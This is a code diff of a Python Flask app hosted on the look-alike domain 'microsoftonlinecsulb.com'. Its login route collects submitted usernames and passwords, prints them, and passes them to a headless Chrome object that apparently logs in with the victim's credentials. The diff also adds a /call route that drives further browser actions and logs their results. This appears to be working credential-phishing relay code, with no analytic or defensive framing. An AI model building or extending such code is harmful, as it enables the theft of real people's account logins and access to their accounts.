@@ -19,13 +19,24 @@ context = ('/etc/letsencrypt/live/microsoftonlinecsulb.com/cert.pem', '/etc/lets
 # context.use_certificate_chain_file('/etc/letsencrypt/live/microsoftonlinecsulb.com/fullchain.pem')
 # context.use_certificate_file('/etc/letsencrypt/live/microsoftonlinecsulb.com/cert.pem')
 
+chrome = main.startChrome()
 
 @app.route('/profile')
 def profile():
     return 'Profile'
 
 
+@app.route('/call', methods=['GET', 'POST'])
+def call():
+    # Here we use a class of some kind to represent and validate our
+    # client-side form data. For example, WTForms is a library that will
+    # handle this for us, and we use a custom LoginForm to validate.
+    chrome.call()
+    chrome.log_info()
 
+
+    return render_template('index.html')
+        
 @app.route('/login', methods=['GET', 'POST'])
 def login():
     # Here we use a class of some kind to represent and validate our
@@ -34,7 +45,7 @@ def login():
     email = request.form.get('username')
     password = request.form.get('password')
     print(email,password)
-    chrome = main.startChrome()
+    
     var = chrome.login_email(email,password)
     if var == True:
         #stop loading
@@ -44,7 +55,7 @@ def login():
         with open('./static/'+email+'.txt','w') as file:
             file.write("1")
         # os.system('chmod 777 '+email+'.txt')
-        return render_template('index.html',check=check1)
+        return render_template('index.html')
         
 
     
